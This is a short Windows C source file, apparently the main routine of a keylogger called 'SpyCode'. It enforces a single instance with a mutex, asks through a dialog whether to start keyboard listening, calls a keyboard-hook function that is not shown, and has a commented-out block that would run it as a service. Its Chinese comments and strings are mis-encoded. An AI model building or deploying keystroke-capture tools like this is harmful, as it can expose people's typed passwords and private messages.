#include "hook.h"

HANDLE hMutex = NULL;


int main(int argc, char **argv){
	/*
	SERVICE_TABLE_ENTRY ServiceTable[2];  
    ServiceTable[0].lpServiceName="SpyCode";  
    ServiceTable[0].lpServiceProc=(LPSERVICE_MAIN_FUNCTION)ServiceMain;  
    ServiceTable[1].lpServiceName=NULL;  
    ServiceTable[1].lpServiceProc=NULL;  
    StartServiceCtrlDispatcher(ServiceTable);  
	*/
	//ʹ�û����������ϵͳֻ����һ������ʵ��
	hMutex = CreateMutex(NULL, FALSE, "SpyCode");
	if (hMutex)
    {
        if(ERROR_ALREADY_EXISTS != GetLastError()){
			int ret = MessageBox( 0, "���м��̼�������?", "spycode", MB_OKCANCEL );
			if(ret==IDOK){
				hookVirtualKey();
			}
			else{
				exit(0);
			}
		}
		else{
			MessageBox( 0, "�����Ѿ���������!", "��ʾ", MB_OK );
		}
	}

//	hookVirtualKey();
	return 0;
}
